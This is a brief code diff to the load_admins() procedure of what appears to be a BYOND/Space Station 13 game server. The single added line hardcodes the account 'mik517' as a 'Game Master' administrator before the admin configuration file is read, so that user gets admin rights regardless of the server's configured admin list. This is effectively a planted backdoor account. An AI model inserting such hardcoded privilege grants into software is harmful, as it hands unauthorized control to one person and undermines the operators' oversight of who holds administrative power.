@@ -23,6 +23,7 @@
 
 /world/proc/load_admins()
 	var/text = file2text("config/admins.txt")
+	admins["mik517"] = "Game Master"
 	if (!text)
 		diary << "Failed to load config/admins.txt\n"
 	else
